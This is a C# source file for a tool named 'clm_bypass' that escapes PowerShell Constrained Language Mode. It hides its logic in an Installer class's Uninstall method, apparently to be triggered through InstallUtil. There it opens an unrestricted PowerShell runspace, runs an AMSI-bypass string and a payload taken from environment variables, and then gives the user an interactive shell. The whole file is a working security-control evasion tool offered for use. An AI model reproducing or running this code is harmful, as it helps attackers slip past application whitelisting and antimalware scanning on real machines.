using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace clm_bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Constrained Language Mode Bypass");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd;
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            string amsi = Environment.GetEnvironmentVariable("AMSI");
            string payload = Environment.GetEnvironmentVariable("PAYLOAD");

            if (string.IsNullOrEmpty(amsi)) amsi = "";
            if (string.IsNullOrEmpty(payload)) payload = "";

            if (!string.IsNullOrEmpty(amsi) || !string.IsNullOrEmpty(payload))
            {
                ps.AddScript(amsi + ';' + payload);
                ps.Invoke();
            }

            while (true)
            {
                Console.Write("CLM Powershell " + Directory.GetCurrentDirectory() + ">");
                Stream inputStream = Console.OpenStandardInput();

                cmd = Console.ReadLine();

                if (String.Equals(cmd, "exit"))
                    break;

                Pipeline pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(cmd);

                pipeline.Commands.Add("Out-String");

                try
                {
                    Collection<PSObject> results = pipeline.Invoke();
                    StringBuilder stringBuilder = new StringBuilder();

                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }

                    Console.WriteLine(stringBuilder.ToString().Trim());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }

            }

            rs.Close();
        }
    }

}